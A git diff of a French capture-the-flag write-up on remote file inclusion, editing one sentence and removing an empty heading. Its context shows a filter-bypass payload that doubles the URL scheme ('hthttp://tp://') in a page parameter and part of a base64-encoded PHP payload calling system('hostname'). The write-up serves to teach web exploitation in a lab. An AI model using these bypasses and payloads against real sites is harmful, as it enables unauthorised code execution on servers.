@@ -4,7 +4,7 @@ Sur ce niveau, il ne semble plus possible d'effectuer une RFI ainsi que d'utilis
 
 ![](../../../../.gitbook/assets/12000a3502b9dc31280d18f793f10c96.png)
 
-Après quelques essais on devine l'utilisation d'un filtrage des patterns `http://` et `https://`. Ce genre de filtrage est très souvent contournable car il est facile pour le développeur d'oublier un scénario. Il suffit par exemple ici de doubler le schéma désiré :
+Après quelques essais j'identifie l'utilisation d'un filtrage des patterns `http://` et `https://`. Ce genre de filtrage est très souvent contournable car il est facile pour le développeur d'oublier un scénario. Il suffit par exemple ici de doubler le schéma désiré :
 
 ```http
 ?page=hthttp://tp://www.google.fr
@@ -43,5 +43,3 @@ La payload encodée en base64 étant la suivante :
   system('hostname');
 ?>
 ```
-
-##
